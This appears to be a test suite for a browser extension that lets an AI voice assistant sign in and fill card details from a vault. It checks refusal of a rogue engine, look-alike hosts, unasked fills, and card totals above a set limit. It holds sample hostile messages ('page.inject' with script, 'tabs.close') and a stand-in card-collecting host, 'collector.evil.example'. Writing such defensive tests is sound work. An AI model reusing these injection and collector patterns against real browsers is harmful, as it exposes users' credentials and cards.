const copy = new FakeExtension({ onCall: () => ({ echo: "copy" }) });
copy.keys = k.pair;
copy.enginePub = k.engine.pub;
const socketsBefore = b.log.sockets.length;
let cr = await copy.connect(port);
await sleep(150);
st = await b.popup({ type: "status" });
check("worker: replaced by another copy (4409) it steps back", cr.state === "live" && st.status.state === "replaced" && b.openSockets() === 0, J(st.status));
for (let i = 0; i < 4; i++) b.fireAlarm();
await sleep(200);
check("worker: …and doesn't fight for the link (no reconnect on the alarm)", b.log.sockets.length === socketsBefore && copy.ws.readyState === copy.ws.OPEN);
const copyClosed = new Promise<number>((resolve) => copy.ws.on("close", (c: number) => resolve(c)));
pr = await b.popup({ type: "connect" });
check("worker: Connect takes it back", pr.outcome === "live" && pr.status.state === "connected" && (await copyClosed) === 4409, J(pr.status));

// ── a rogue engine on the port ──
const rogueGot: string[] = [];
const rogue = await new Promise<{ port: number; close: () => void }>((resolve) => {
  const wss = new WebSocketServer({ port: 0, host: "127.0.0.1" }, () => resolve({ port: (wss.address() as { port: number }).port, close: () => wss.close() }));
  wss.on("connection", (ws) =>
    ws.on("message", (raw) => {
      const msg = JSON.parse(String(raw)) as { type: string };
      rogueGot.push(msg.type);
      if (msg.type !== "hello") return;
      ws.send(J({ type: "challenge", nonce: crypto.randomBytes(16).toString("base64"), proof: crypto.randomBytes(32).toString("base64") }));
      ws.send(J({ type: "welcome", own: [] }));
      ws.send(J({ type: "call", id: "evil1", method: "tabs.close", params: { tabId: linky.id } }));
      ws.send(J({ type: "call", id: "evil2", method: "page.inject", params: { tabId: linky.id, js: "alert(1)" } }));
    }),
  );
});
const tabsBefore = b.tabs.length;
await b.storage.local.set({ engine: `ws://127.0.0.1:${rogue.port}` });
await until(() => rogueGot.includes("hello") && b.openSockets() === 0, 3000);
await sleep(150);
st = await b.popup({ type: "status" });
check("worker: an engine that can't prove the key gets nothing — no auth, no tab list, no call run", !rogueGot.includes("auth") && !rogueGot.includes("result") && !rogueGot.includes("tabs") && b.tabs.length === tabsBefore && st.status.state === "error" && /couldn't prove/.test(st.status.detail), `${rogueGot.join(",")} ${J(st.status)}`);
check("worker: …and it is not mistaken for 'pair again' (the pairing stands)", st.paired === true && b.storage.local.data.repair !== true);
rogue.close();
await b.storage.local.set({ engine: ENGINE });
check("worker: back on the real engine it connects again", await until(() => bridge.browserConnected(), 4000));

// ── paused by the user ──
pr = await b.popup({ type: "disconnect" });
const pausedSockets = b.log.sockets.length;
for (let i = 0; i < 3; i++) b.fireAlarm();
await sleep(150);
check("worker: Disconnect closes the link and keeps it closed", pr.status.state === "paused" && !bridge.browserConnected() && b.log.sockets.length === pausedSockets);
pr = await b.popup({ type: "connect" });
check("worker: Connect brings it back", pr.outcome === "live" && bridge.browserConnected());

// ── a new code mistyped again and again while paired: the pairing in place comes straight back each time ──
const retryCode = bridge.newPairingCode().code as string;
const mistyped = `${retryCode.slice(0, 3)}${retryCode[3] === "A" ? "B" : "A"}${retryCode.slice(4)}`;
const outcomes: string[] = [];
for (let i = 0; i < 4; i++) outcomes.push((await b.popup({ type: "pair", code: mistyped })).outcome);
const sinceLast = Date.now();
const backSoon = await until(() => bridge.browserConnected(), 3500);
check("worker: four mistyped codes while paired — each refused, and the pairing in place is back within seconds, not a growing wait", outcomes.every((o) => o === "wrong-code") && backSoon, `${J(outcomes)} back after ${Date.now() - sinceLast} ms`);

// ── 4401: the engine no longer knows this browser ──
bridge.unpairBrowser();
await until(() => b.openSockets() === 0, 2000);
await sleep(100);
st = await b.popup({ type: "status" });
const repairSockets = b.log.sockets.length;
for (let i = 0; i < 4; i++) b.fireAlarm();
await sleep(200);
check("worker: unpaired by the engine (4401) it asks to pair again, and stops trying", st.status.state === "repair" && /pair again/i.test(st.status.detail) && b.log.sockets.length === repairSockets, J(st.status));
code = bridge.newPairingCode().code as string;
pr = await b.popup({ type: "pair", code });
check("worker: pairing again with a new code restores the link", pr.outcome === "live" && bridge.browserConnected() && b.storage.local.data.repair === false, J(pr.status));

// ════════════════════════════════════════════════════════════════════════════════════════
console.log("\n── Part 3: the tools, against an in-memory vault ──");
type Meta = { id: string; kind: "login" | "card" | "identity" | "secret"; label: string; hosts: string[]; usernameHint?: string; brand?: string; last4?: string; hasTotp?: boolean; hasCvc?: boolean; createdAt: number; updatedAt: number; lastUsedAt: number | null };
type FormReq = { id: string; purpose: string; title: string; detail: string; host?: string; fields: { name: string; type: string; value?: string }[]; submitLabel: string; expiresAt: number };
type Outcome = { status: "submitted"; itemId?: string } | { status: "approved" } | { status: "cancelled" | "expired" };

const C = {
  user: CANARY_USER,
  pass: CANARY_PW,
  userWork: "canary.work.5520@example.com",
  passWork: "CANARY-work-Qm55#vv",
  totpSeed: "JBSWY3DPEHPK3PXPCANARYSEED",
  totpCode: "492817",
  card: "4242424242424242",
  holder: "CANARY HOLDER NAME",
  cvc: "9173",
  cvcKept: "6081",
  fullName: "Canarina Quill-Tester",
  email: "canary.identity.4410@example.com",
  phone: "+1 555 0147 9921",
  address1: "77 Canary Row",
  address2: "Flat 9c",
  city: "Canaryville",
  region: "CA",
  postal: "CQ4 4RY",
  newUser: "canary.fresh.9034@example.com",
  newPass: "CANARY-fresh-Lp20$zz",
};

/** A vault that lives in this test: the same functions the fill tools call, the same promises about what a callback gets. */
function memoryVault() {
  const items = new Map<string, { meta: Meta; secret: Record<string, unknown> }>();
  const forms = new Map<string, { form: FormReq; settle: (o: Outcome) => void; open: boolean; done: Promise<Outcome> }>();
  const oneTime = new Map<string, Record<string, string>>();
  const state = {
    blocked: undefined as string | undefined,
    /** Locked with a passphrase: nothing can be used until the unlock form is submitted. */
    lock: "device" as "device" | "passphrase",
    locked: false,
    /** The next useSecret fails this way (a vault error by its code, or any other error). */
    failNext: null as null | Error | { code: string; message: string },
    limit: 200,
    used: [] as { id: string; purpose: string }[],
    oneTimeUses: 0,
    lieAboutHost: null as string | null,
  };
  const vaultError = (code: string, message: string) => Object.assign(new Error(message), { name: "VaultError", code });
  /** What a callback is handed: fields read as strings; the whole prints as "[secret]"; emptied afterwards. */
  const guard = (values: Record<string, unknown>) => {
    let live: Record<string, unknown> | null = { ...values };
    const view = Object.create({ toJSON: () => "[secret]", toString: () => "[secret]" }) as Record<string, unknown>;
    for (const key of Object.keys(values))
      Object.defineProperty(view, key, {
        enumerable: true,
        get() {
          if (!live) throw new Error("that secret is no longer available");
          return live[key];
        },
      });
    return { view, revoke: () => void (live = null) };
  };
  const leaks = (value: unknown, secrets: unknown[]) => {
    const text = J(value) ?? "";
    return secrets.some((s) => typeof s === "string" && s.length >= 6 && text.includes(s));
  };
  const add = (meta: Partial<Meta> & { kind: Meta["kind"]; label: string }, secret: Record<string, unknown>): Meta => {
    const full: Meta = { id: `item-${items.size + 1}-${crypto.randomBytes(4).toString("hex")}`, hosts: [], createdAt: Date.now(), updatedAt: Date.now(), lastUsedAt: null, ...meta };
    items.set(full.id, { meta: full, secret });
    return full;
  };
  const api = {
    vaultStatus: () => ({ state: state.locked ? ("locked" as const) : ("unlocked" as const), lock: state.lock, items: items.size, ...(state.blocked ? { blocked: state.blocked } : {}) }),
    listItems: (kind?: Meta["kind"]) => [...items.values()].map((i) => i.meta).filter((m) => !kind || m.kind === kind),
    findLogins: (host: string) => (state.lieAboutHost ? [...items.values()].map((i) => i.meta).filter((m) => m.kind === "login" && m.hosts.includes(state.lieAboutHost!)) : [...items.values()].map((i) => i.meta).filter((m) => m.kind === "login" && m.hosts.includes(host))),
    getMeta: (id: string) => items.get(id)?.meta ?? null,
    async useSecret<T>(id: string, purpose: string, fn: (secret: never, meta: never) => Promise<T>): Promise<T> {
      const item = items.get(id);
      if (state.failNext) {
        const f = state.failNext;
        state.failNext = null;
        throw f instanceof Error ? f : vaultError(f.code, f.message);
      }
      if (state.locked && state.lock === "passphrase") throw vaultError("locked", "The vault is locked.");
      if (!item) throw vaultError("not-found", "That item isn't in the vault.");
      state.used.push({ id, purpose });
      const handed = guard({ ...item.secret, ...(item.secret.totpSecret ? { totpCode: C.totpCode } : {}) });
      try {
        const result = await fn(handed.view as never, item.meta as never);
        if (leaks(result, Object.values(item.secret))) throw new Error("leak");
        return result;
      } finally {
        handed.revoke();
        item.meta.lastUsedAt = Date.now();
      }
    },
    openForm(req: Omit<FormReq, "id" | "expiresAt">) {
      // (Like the real one: there is only ever one unlock form.)
      const up = req.purpose === "unlock" ? [...forms.values()].find((f) => f.open && f.form.purpose === "unlock") : undefined;
      if (up) return { form: structuredClone(up.form), done: up.done };
      const form: FormReq = { ...req, id: crypto.randomBytes(24).toString("base64url"), expiresAt: Date.now() + 600_000 };
      let settle!: (o: Outcome) => void;
      const done = new Promise<Outcome>((resolve) => (settle = resolve));
      forms.set(form.id, { form, settle, open: true, done });
      workspace.agent("tool", { tool: "vault_form", text: form.title }); // (what a window is told is a descriptor: checked by the canary)
      return { form: structuredClone(form), done };
    },
    openForms: () => [...forms.values()].filter((f) => f.open).map((f) => structuredClone(f.form)),
    async useOneTime<T>(formId: string, fn: (values: never) => Promise<T>): Promise<T> {
      const values = oneTime.get(formId);
      oneTime.delete(formId);
      if (!values) throw vaultError("gone", "That one-time entry is gone.");
      state.oneTimeUses++;
      const handed = guard(values);
      try {
        return await fn(handed.view as never);
      } finally {
        handed.revoke();
      }
    },
    spendingLimit: () => state.limit,
  };
  return {
    api,
    state,
    items,
    add,
    /** The open form of this purpose (the newest). */
    form: (purpose: string) => [...forms.values()].reverse().find((f) => f.open && f.form.purpose === purpose)?.form ?? null,
    openForms: () => [...forms.values()].filter((f) => f.open).length,
    /** What the workspace's secure form does when the user presses its button. */
    submit(formId: string, values: Record<string, string> = {}) {
      const f = forms.get(formId)!;
      f.open = false;
      if (f.form.purpose === "confirm") return f.settle({ status: "approved" });
      if (f.form.purpose === "unlock") {
        state.locked = false;
        return f.settle({ status: "submitted" });
      }
      if (f.form.purpose === "one-time") {
        oneTime.set(formId, values);
        return f.settle({ status: "submitted" });
      }
      const label = values.label || f.form.fields.find((x) => x.name === "label")?.value || "Saved";
      const meta = add({ kind: "login", label, hosts: f.form.host ? [f.form.host] : [], usernameHint: `${values.username?.[0] ?? ""}…`, hasTotp: Boolean(values.totpSecret) }, { username: values.username, password: values.password, ...(values.totpSecret ? { totpSecret: values.totpSecret } : {}) });
      f.settle({ status: "submitted", itemId: meta.id });
    },
    cancel(formId: string) {
      const f = forms.get(formId)!;
      f.open = false;
      f.settle({ status: "cancelled" });
    },
    oneTimeHeld: () => oneTime.size,
  };
}
const mem = memoryVault();
fillTools.useFillVault(mem.api as never);

const tools = getTools() as { name: string; sensitive?: boolean; available?: (c: { persona: unknown }) => boolean; run: (args: Record<string, unknown>, ctx: unknown) => Promise<Record<string, unknown>> }[];
const tool = (n: string) => tools.find((t) => t.name === n)!;
const persona = { id: "trinity", name: "Trinity", description: "You are Trinity.", voicePrompt: "", voice: "NATF2", traits: {}, toolsets: [] as string[], updatedAt: 0 };
const emitted: Record<string, unknown>[] = [];
const results: unknown[] = [];
const said = [{ id: "t0", speaker: "user", text: "hello", ts: Date.now() }];
const ctx = (utterance: string, extra: Record<string, unknown> = {}) => ({ persona, recentTranscript: said, emit: (e: Record<string, unknown>) => emitted.push(e), utterance, memory: {}, situation: contextFor(persona).summary, ...extra });
const run = async (name: string, utterance: string, args: Record<string, unknown> = {}, extra: Record<string, unknown> = {}) => {
  const res = await tool(name).run(args, ctx(utterance, extra));
  results.push(res);
  return res;
};
const answer = async (words: string) => {
  const res = (await answerPending(words)) as Record<string, unknown>;
  results.push(res);
  return res;
};
const told = () => emitted.filter((e) => e.type === "transcript").map((e) => String((e.turn as { text: string }).text));
const fillCalls = () => calledOf("page.fill");
const line = (res: Record<string, unknown>) => String(res.speak ?? res.say ?? "");
const fixture = (file: string) => fs.readFileSync(new URL(`./fixtures/browser/${file}`, import.meta.url), "utf8").replaceAll("{{OTHER}}", "https://collector.evil.example");
/** Close every tab but Trinity's own, and open a page in front: a fixture by its file name, or the HTML given. */
const fresh = (file: string, url: string, html?: string) => {
  for (const t of [...b.tabs]) if (t.id !== ownTab.id) void b.chrome.tabs.remove(t.id);
  return html === undefined ? b.openFixture(file, url) : b.openTab(url, html);
};
const settle = () => sleep(350); // the worker reports tab changes a quarter of a second after they happen

check("tools: the three fill tools are registered, sensitive, and offered while the extension is connected", ["browser_sign_in", "browser_fill_card", "browser_fill_details"].every((n) => tool(n) && tool(n).sensitive === true && visibleTools(persona).some((t: { name: string }) => t.name === n)));
check("tools: hidden from a Game Master persona, like the other browser tools", !visibleTools({ ...persona, toolsets: ["game"] }).some((t: { name: string }) => /^browser_(sign_in|fill)/.test(t.name)));
check("tools: every spoken line comes from code — sensitive tools take no free-text argument", ["browser_sign_in", "browser_fill_card", "browser_fill_details"].every((n) => Object.keys((tool(n) as unknown as { input: object }).input).length === 1 && (tool(n) as unknown as { argMode: string }).argMode === "raw"));

// ── sign-in with one login ──
const acme = mem.add({ kind: "login", label: "Acme", hosts: ["www.acme.example"], usernameHint: "c…@example.com" }, { username: C.user, password: C.pass });
let tab = fresh("login.html", "https://www.acme.example/login");
await settle();
let res = await run("browser_sign_in", "sign in");
check("sign-in: one saved login → filled and the form's own button pressed, once", res.ok === true && line(res) === "Filled your Acme login on www.acme.example, and pressed the button." && el(tab.id, "email").value === C.user && el(tab.id, "password").value === C.pass && submitsOf(tab.id).length === 1 && submitsOf(tab.id)[0]!.form === el(tab.id, "login"), `${line(res)} ${J(valuesOf(tab.id))}`);
check("sign-in: the result names kinds and a host, nothing else", J(res.data) === J({ host: "www.acme.example", filled: ["username", "password"], pressed: true, item: acme.id }), J(res.data));
const inThePage = J(valuesOf(tab.id)); // (kept for the canary's control: this is where the values belong)
check("sign-in: the vault's log says what it was for — a purpose, not a value", mem.state.used.length === 1 && mem.state.used[0]!.purpose === "fill on www.acme.example");
check("sign-in: only the login's own boxes were filled", el(tab.id, "news").value === "" && Object.keys(valuesOf(tab.id)).length === 2, J(Object.keys(valuesOf(tab.id))));
tab = fresh("login.html", "https://www.acme.example/login");
await settle();
res = await run("browser_sign_in", "use my saved password");
check("sign-in: 'use my saved password' fills and presses nothing", res.ok === true && line(res) === "Filled your Acme login on www.acme.example." && el(tab.id, "password").value === C.pass && submitsOf(tab.id).length === 0, line(res));
// Through the same path a spoken request takes (act): what the workspace trail and the "what was just found" notes get.
tab = fresh("login.html", "https://www.acme.example/login");
await settle();
const outcome = await act({ action: "browser_sign_in", confidence: 1, tool: tool("browser_sign_in") as never, options: {}, offered: [], ms: 0 }, "log me in", { persona: persona as never, memory: {} as never, emit: (e: Record<string, unknown>) => emitted.push(e), recentTranscript: said as never, situation: "", minConfidence: 0.7 });
results.push(outcome);
check("sign-in: through act() too", outcome.ok === true && /^Filled your Acme login on www\.acme\.example/.test(outcome.say) && el(tab.id, "password").value === C.pass, outcome.say);

// ── asked by anyone but the user ──
tab = fresh("login.html", "https://www.acme.example/login");
await settle();
let sent = fillCalls();
res = await run("browser_sign_in", "sign in", {}, { userWords: "book me a table and sign in wherever needed" });
check("sign-in: a planner's step is refused, and nothing is sent", res.ok === false && /only happens when you ask me for it yourself/.test(line(res)) && fillCalls() === sent && el(tab.id, "password").value === "", line(res));
workspace.activity("heartbeat:test-task", "Scheduled: check my account…");
res = await run("browser_sign_in", "sign in", {}, { recentTranscript: [] });
const cardRes = await run("browser_fill_card", "fill in my card", {}, { recentTranscript: [] });
workspace.activity("heartbeat:test-task", null);
check("sign-in: a scheduled run is refused too (and so is a card fill)", res.ok === false && cardRes.ok === false && /ask me for it yourself/.test(line(res)) && fillCalls() === sent && pendingQuestion() === null, line(res));
mem.state.blocked = "Sign-in checks are switched off (TRINITY_AUTH=off), so the vault stays locked.";
res = await run("browser_sign_in", "sign in");
mem.state.blocked = undefined;
check("sign-in: a vault that may not be used is said, not worked around", res.ok === false && line(res) === "I can't use the vault right now. Settings, under Vault, says why." && fillCalls() === sent, line(res));

// ── a vault locked with a passphrase (after a restart, or fifteen idle minutes) ──
const LOCKED = "The vault is locked. Type your passphrase in the secure form on the workspace, then ask me again.";
mem.state.lock = "passphrase";
mem.state.locked = true;
const toldLock = told().length;
res = await run("browser_sign_in", "sign in");
const unlock = mem.form("unlock");
check("locked: it says so and puts the vault's passphrase form up; nothing is sent", res.ok === false && line(res) === LOCKED && unlock !== null && fillCalls() === sent && el(tab.id, "password").value === "", line(res));
res = await run("browser_fill_card", "fill in my card");
check("locked: asking again meanwhile doesn't put up a second form", line(res) === LOCKED && mem.openForms() === 1 && pendingQuestion() === null, line(res));
mem.submit(unlock!.id);
await until(() => told().length > toldLock);
await sleep(50);
check("locked: once the passphrase is in, it says so — once", told().slice(toldLock).join(" | ") === "The vault is unlocked. Ask me again.", told().slice(toldLock).join(" | "));
res = await run("browser_sign_in", "sign in");
check("locked: asked again, it signs in", /^Filled your Acme login on www\.acme\.example/.test(line(res)) && el(tab.id, "password").value === C.pass, line(res));
// The vault locking itself in the middle of a sign-in, or failing any other way: what is said is written in the tool —
// an error's own words (which could quote anything) are never repeated.
tab = fresh("login.html", "https://www.acme.example/login");
await settle();
mem.state.failNext = { code: "locked", message: `locked while holding ${C.pass}` };
res = await run("browser_sign_in", "sign in");
check("failing vault: locked mid-way → the fixed line and the passphrase form, not the error's words", res.ok === false && line(res) === LOCKED && mem.form("unlock") !== null && !J(res).includes("CANARY"), line(res));
mem.cancel(mem.form("unlock")!.id);
mem.state.failNext = { code: "tampered", message: `bad block near ${C.pass}` };
res = await run("browser_sign_in", "sign in");
check("failing vault: a tampered file → its own fixed line", line(res) === "The vault's file doesn't check out, so I left it alone. Settings, under Vault, has more." && !J(res).includes("CANARY"), line(res));
mem.state.failNext = { code: "a-code-from-the-future", message: C.pass };
res = await run("browser_sign_in", "sign in");
check("failing vault: a code this tool doesn't know → the plain fixed line", line(res) === "The vault couldn't do that." && !J(res).includes("CANARY"), line(res));
mem.state.failNext = new Error(`ENOENT: no such file, open '${C.pass}'`);
res = await run("browser_sign_in", "sign in");
check("failing vault: any other error → a fixed line too, and nothing was typed", line(res) === "Something went wrong before anything was filled in." && !J(res).includes("CANARY") && el(tab.id, "password").value === "", line(res));

// ── a host the login isn't saved for ──
tab = fresh("login.html", "https://www.acme.example.evil.test/login");
await settle();
sent = fillCalls();
res = await run("browser_sign_in", "sign in");
check("sign-in: a look-alike host has no login — the save form opens for THAT host; the Acme login stays put", res.ok === true && /don't have a login saved for www\.acme\.example\.evil\.test/.test(line(res)) && fillCalls() === sent && el(tab.id, "password").value === "" && mem.form("save-login")?.host === "www.acme.example.evil.test", line(res));
mem.cancel(mem.form("save-login")!.id);
await until(() => told().some((t) => /nothing was saved/.test(t)));
check("sign-in: cancelling that form is said, and nothing is filled", told().some((t) => /nothing was saved, and I've left the sign-in alone/.test(t)) && el(tab.id, "password").value === "");
mem.state.lieAboutHost = "www.acme.example"; // a vault that answers with the wrong site's login
res = await run("browser_sign_in", "sign in");
mem.state.lieAboutHost = null;
check("sign-in: even handed the wrong login, the engine checks the host before anything is sent", res.ok === false && /isn't saved for/.test(line(res)) && fillCalls() === sent && mem.state.used.every((u) => u.purpose !== "fill on www.acme.example.evil.test") && el(tab.id, "password").value === "", line(res));
tab = fresh("login.html", "http://www.acme.example/login");
await settle();
res = await run("browser_sign_in", "sign in");
check("sign-in: an http page is refused in words", res.ok === false && line(res) === "www.acme.example isn't a secure page, so I won't fill anything in there." && fillCalls() === sent, line(res));
b.activate(ownTab.id);
for (const t of [...b.tabs]) if (t.id !== ownTab.id) b.chrome.tabs.remove(t.id);
await settle();
res = await run("browser_sign_in", "sign in");
check("sign-in: with only Trinity's own page open there is nothing to fill", res.ok === false && /no web page open/.test(line(res)), line(res));

// ── none saved: the secure form, then the sign-in goes on ──
tab = fresh("login.html", "https://shop.example/login");
await settle();
const toldBefore = told().length;
res = await run("browser_sign_in", "log in");
const saveForm = mem.form("save-login")!;
check("sign-in: none saved → the secure form is opened for this exact host, and the tool answers at once", res.ok === true && res.inProgress === "started" && /I don't have a login saved for shop\.example\. I've opened a secure form/.test(line(res)) && /can't see or hear what you type/.test(line(res)) && saveForm.host === "shop.example" && saveForm.fields.some((f) => f.name === "label" && f.value === "Shop") && !saveForm.fields.some((f) => /pass|user/.test(f.name) && f.value), line(res));
check("sign-in: …with nothing filled while it waits", el(tab.id, "password").value === "" && submitsOf(tab.id).length === 0);
mem.submit(saveForm.id, { label: "Shop", username: C.newUser, password: C.newPass });
await until(() => told().length > toldBefore && el(tab.id, "password").value === C.newPass);
check("sign-in: once the form is submitted the sign-in goes on, and says so", told().slice(toldBefore).join(" | ") === "Saved your Shop login. Filled your Shop login on shop.example, and pressed the button." && el(tab.id, "email").value === C.newUser && el(tab.id, "password").value === C.newPass && submitsOf(tab.id).length === 1, told().slice(toldBefore).join(" | "));

// ── several saved for one site ──
mem.add({ kind: "login", label: "Acme Work", hosts: ["www.acme.example"], usernameHint: "c…@example.com" }, { username: C.userWork, password: C.passWork });
acme.label = "Acme Personal";
tab = fresh("login.html", "https://www.acme.example/login");
await settle();
sent = fillCalls();
res = await run("browser_sign_in", "sign in");
check("sign-in: several saved → asks which, by label, and fills nothing", res.ok === true && line(res) === "I have 2 logins saved for www.acme.example: Acme Personal and Acme Work. Which one? Say, for example, sign in with Acme Personal." && fillCalls() === sent && el(tab.id, "password").value === "", line(res));
check("sign-in: …and Jev is offered the labels to choose from (ids, never secrets)", J(Object.values((tool("browser_sign_in") as unknown as { options: (a: string, c: unknown) => Record<string, string> }).options("login", { persona }))) === '["Acme Personal","Acme Work"]');
res = await run("browser_sign_in", "sign in with the work one");
check("sign-in: naming one fills that one", res.ok === true && /^Filled your Acme Work login on www\.acme\.example/.test(line(res)) && el(tab.id, "email").value === C.userWork && el(tab.id, "password").value === C.passWork, line(res));
mem.items.delete([...mem.items.values()].find((i) => i.meta.label === "Acme Work")!.meta.id);
acme.label = "Acme";

// ── a sign-in in steps, with a one-time code ──
const steps = mem.add({ kind: "login", label: "Stepwise", hosts: ["steps.example"], hasTotp: true }, { username: C.user, password: C.pass, totpSecret: C.totpSeed });
/** What the page's own script does when a step is submitted (this DOM runs no scripts): show the next step a moment later. */
const wireSteps = (tabId: number) => {
  const show = (id: string) => setTimeout(() => {
    for (const s of ["step1", "step2", "step3"]) (s === id ? el(tabId, s).removeAttribute("hidden") : el(tabId, s).setAttribute("hidden", ""));
  }, 300);
  el(tabId, "step1").addEventListener("submit", (e) => (e.preventDefault(), void show("step2")));
  el(tabId, "step2").addEventListener("submit", (e) => (e.preventDefault(), void show("step3")));
  el(tabId, "step3").addEventListener("submit", (e) => e.preventDefault());
};
tab = fresh("two-step.html", "https://steps.example/signin");
wireSteps(tab.id);
await settle();
const toldSteps = told().length;
res = await run("browser_sign_in", "sign me in");
// (Three rounds with page changes between them can outlast a tool's patience: then the line is told when it lands.)
const finalLine = res.inProgress === "started" ? (await until(() => told().length > toldSteps, 15_000), told()[told().length - 1] ?? "") : line(res);
const digits = fieldsOf(tab.id).filter((f) => /^code\d$/.test(f._ga("name") ?? "")).map((f) => f.value).join("");
check("steps: user name → Next → password → Sign in → the one-time code, in three rounds", finalLine === "Filled your Stepwise login on steps.example, with the one-time code, and pressed the button." && el(tab.id, "ident").value === C.user && el(tab.id, "pw").value === C.pass && digits === C.totpCode, `${finalLine} | ${J(valuesOf(tab.id))}`);
check("steps: 'Next' and 'Sign in' were each pressed once; the code's form was left for the user", submitsOf(tab.id).map((s) => s.form._ga("id")).join(",") === "step1,step2", submitsOf(tab.id).map((s) => s.form._ga("id")).join(","));
// The same page for a login with no authenticator key: the code is the user's to type.
steps.hasTotp = false;
delete mem.items.get(steps.id)!.secret.totpSecret;
tab = fresh("two-step.html", "https://steps.example/signin");
el(tab.id, "step1").setAttribute("hidden", "");
el(tab.id, "step2").removeAttribute("hidden");
el(tab.id, "step3").removeAttribute("hidden");
await settle();
res = await run("browser_sign_in", "sign in");
check("steps: a code box and no code to give → the password goes in, nothing is pressed, and it says the code is yours", res.ok === true && line(res) === "Filled your Stepwise login on steps.example. It's asking for a one-time code now, which I don't have — that part is yours." && el(tab.id, "pw").value === C.pass && submitsOf(tab.id).length === 0 && !J(res).includes(C.totpCode), line(res));
tab = fresh("", "https://steps.example/join", '<!doctype html><html><head><title>Join</title></head><body><form action="/join"><label>Email <input type="email" name="email" /></label><label>Choose a password <input type="password" name="p1" /></label><label>Repeat it <input type="password" name="p2" /></label><button>Create account</button></form></body></html>');
await settle();
sent = fillCalls();
res = await run("browser_sign_in", "sign in");
check("steps: a form for a NEW password is not a sign-in: the saved password isn't put there", res.ok === false && /form for a new password/.test(line(res)) && fillCalls() === sent && fieldsOf(tab.id).every((f) => f.value === ""), line(res));

// ── a card ──
const visa = mem.add({ kind: "card", label: "Visa ending 4242", hosts: [], brand: "Visa", last4: "4242", hasCvc: false }, { number: C.card, holder: C.holder, expMonth: 3, expYear: 2031 });
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
sent = fillCalls();
res = await run("browser_fill_card", "fill in my card");
check("card: it asks first — naming the card, the site and the total, and the words that say yes — and fills nothing", res.ok === true && line(res) === "Fill your Visa ending 4242 on checkout.shop.example? The total there shows $51.25. To go ahead, say: yes, fill it in." && pendingQuestion() !== null && fillCalls() === sent && el(tab.id, "ccnum").value === "", line(res));
res = await answer("no thanks");
check("card: a no leaves the page as it was", line(res) === "Okay — I've left the card out." && fillCalls() === sent && el(tab.id, "ccnum").value === "" && mem.openForms() === 0, line(res));
res = await run("browser_fill_card", "pay with my card");
const toldCard = told().length;
// A bare "yes" (or "sure", or Trinity's own "okay" heard back) is not enough: the yes has to say "fill".
for (const bare of ["yes", "sure", "okay"]) {
  res = await answer(bare);
  check(`card: a bare "${bare}" fills nothing — the question is asked again, with the words to say`, res.ok === false && /^Fill your Visa ending 4242 on checkout\.shop\.example\? The total there shows \$51\.25\. To go ahead, say: yes, fill\.$/.test(line(res)) && pendingQuestion() !== null && fillCalls() === sent && mem.openForms() === 0 && el(tab.id, "ccnum").value === "", line(res));
}
res = await answer("yes, fill it in");
const codeForm = mem.form("one-time")!;
check("card: after \"yes, fill it in\", a security code that isn't kept is asked for in a one-time form — not by voice", res.ok === true && res.inProgress === "started" && /needs its security code, which I don't keep\. I've opened a secure form/.test(line(res)) && codeForm.fields.length === 1 && codeForm.fields[0]!.name === "cvc" && codeForm.host === "checkout.shop.example" && el(tab.id, "ccnum").value === "", line(res));
mem.submit(codeForm.id, { cvc: C.cvc });
await until(() => told().length > toldCard);
check("card: then it fills — number, name, the split expiry, the code — and says it pressed nothing", told()[told().length - 1] === "Filled your Visa ending 4242 on checkout.shop.example. I haven't pressed anything: paying is yours to do." && el(tab.id, "ccnum").value === C.card && el(tab.id, "ccname").value === C.holder && el(tab.id, "expm").value === "03" && el(tab.id, "expy").value === "31" && el(tab.id, "cvc").value === C.cvc, `${told()[told().length - 1]} ${J(valuesOf(tab.id))}`);
check("card: it never presses Pay", submitsOf(tab.id).length === 0);
check("card: the one-time code was used once and is gone", mem.state.oneTimeUses === 1 && mem.oneTimeHeld() === 0 && (await mem.api.useOneTime(codeForm.id, async () => "again").then(() => "used again", () => "gone")) === "gone");
check("card: a card fill leaves the contact and address boxes alone", ["fullname", "mail", "addr1", "zip"].every((id) => el(tab.id, id).value === ""));
// Above the limit: an Approve button, not a spoken yes.
mem.state.limit = 50;
visa.hasCvc = true;
mem.items.get(visa.id)!.secret.cvc = C.cvcKept;
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
sent = fillCalls();
const toldLimit = told().length;
res = await run("browser_fill_card", "fill in my card");
const confirm = mem.form("confirm")!;
check("card: a total above the limit → an Approve button in the secure form, and no spoken question", res.ok === true && res.inProgress === "started" && /above your limit of 50/.test(line(res)) && /Approve button on the workspace/.test(line(res)) && pendingQuestion() === null && confirm.fields.length === 0 && /\$51\.25/.test(confirm.detail) && fillCalls() === sent, line(res));
mem.submit(confirm.id);
await until(() => told().length > toldLimit);
check("card: approved → filled, with the kept security code, no second form", told()[told().length - 1] === "Filled your Visa ending 4242 on checkout.shop.example. I haven't pressed anything: paying is yours to do." && el(tab.id, "ccnum").value === C.card && el(tab.id, "cvc").value === C.cvcKept && mem.form("one-time") === null, told()[told().length - 1]);
// A limit of zero: always the button, however small the total.
mem.state.limit = 0;
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_fill_card", "fill in my card");
check("card: a limit of zero means always the Approve button", res.inProgress === "started" && /card fills are set to always need approval/.test(line(res)) && pendingQuestion() === null && mem.form("confirm") !== null, line(res));
mem.cancel(mem.form("confirm")!.id);
await sleep(50);
mem.state.limit = 200;
// No total on the page counts as above the limit.
tab = fresh("", "https://checkout.shop.example/pay", fixture("checkout.html").replace(/<aside[\s\S]*?<\/aside>/, "").replace(/Pay \$51\.25/, "Pay now"));
await settle();
res = await run("browser_fill_card", "fill in my card");
check("card: no total to read → the Approve button too", res.inProgress === "started" && /couldn't read a total/.test(line(res)) && pendingQuestion() === null && mem.form("confirm") !== null, line(res));
mem.cancel(mem.form("confirm")!.id);
await sleep(50);
// The page moves on between the question and the yes.
tab = fresh("checkout.html", "https://checkout.shop.example/pay");
await settle();
res = await run("browser_fill_card", "fill in my card");
b.navigate(tab.id, "https://elsewhere.example/pay", fixture("checkout.html"));
await settle();
sent = fillCalls();
res = await answer("yes, fill it in");
check("card: a yes given for one site is not used on another", res.ok === false && /moved on from checkout\.shop\.example/.test(line(res)) && fillCalls() === sent && el(tab.id, "ccnum").value === "", line(res));
// Card fields in the payment provider's frame.
tab = fresh("iframe-card.html", "https://framed.shop.example/pay");
b.addFrame(tab.id, "https://collector.evil.example/card-frame.html", fixture("card-frame.html"));
await settle();
